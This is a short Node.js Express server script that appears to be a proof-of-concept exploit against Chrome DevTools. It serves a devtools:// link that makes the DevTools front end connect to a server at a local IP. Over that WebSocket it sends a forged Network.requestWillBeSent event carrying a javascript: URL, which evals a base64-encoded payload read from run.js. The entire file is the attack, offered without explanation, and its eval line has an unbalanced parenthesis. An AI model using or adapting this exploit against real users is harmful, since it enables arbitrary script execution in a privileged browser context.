const express = require('express')
const app = express()                       //define web app
const fs = require('fs')
var expressWs = require('express-ws')(app)  //websockets

app.get("/", (req, res) => {
    res.send("devtools://devtools/bundled/devtools_app.html?experiments=true&ws=192.168.0.12")
})

jsFile = fs.readFileSync('run.js').toString();
payload = btoa(jsFile.toString())

app.ws('/', function(ws, req) {
    ws.on('message', function(msg) {
        ws.send(
            JSON.stringify({
                method: "Network.requestWillBeSent",
                params: {
                    request: {
                        url: `javascript: (function () { {eval(atob(${[payload]})))}} )`
                    },
                },
            }),
        )
    })
});

app.listen(80, () => {
    console.log("example is running on")
})